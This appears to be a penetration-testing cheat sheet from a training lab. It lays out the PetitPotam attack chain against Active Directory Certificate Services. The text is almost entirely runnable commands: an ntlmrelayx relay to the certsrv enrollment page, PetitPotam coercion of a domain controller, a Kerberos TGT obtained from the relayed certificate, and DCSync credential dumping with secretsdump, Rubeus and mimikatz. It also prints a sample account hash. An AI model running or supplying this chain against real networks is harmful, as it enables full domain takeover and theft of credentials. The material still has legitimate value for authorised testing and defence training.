-- -
Explanation [here](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/)
Allows an unauthenticated attacker to coerce a DC to authenticate against another host using NTLM over part 445 via the Local Security Authority Remote Protocol (LSARPC) by abusing Microsoft's Encrypting File System Remote Protocol (MS-EFSRPC). Allows you to fully take over the domain. 
## From Linux
```bash
# start ntlm relay
sudo ntlmrelayx.py -debug -smb2support --target http://<dc ip/host>/certsrv/certfnsh.asp  --adcs --template DomainController

sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController

# Run exploit
python3 PetitPotam.py <attack ip> <dc ip>

# In ntlm realy, you should see a base64 encoded certificate for the DDC
# Request TGT using base64 cert
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache

# set env variable to ccache file output by previous command, not explained why
export KRB5CCNAME=dc01.ccache

# DCSync attack using TGT for specific user
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

# Previous command should output that admin's hash, use it for full DCSync attack
# DCSync the whole enchilada
secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
```
## From Windows
```powershell
# You will still do the ntlm relay and PetitPotam steps from linux above, then from windows:
.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt

# Confirm tgt in memory
klist

# Then proceed w/ DCSync attack
# in mimikatz
lsadump::dcsync /user:inlanefreight\krbtgt
```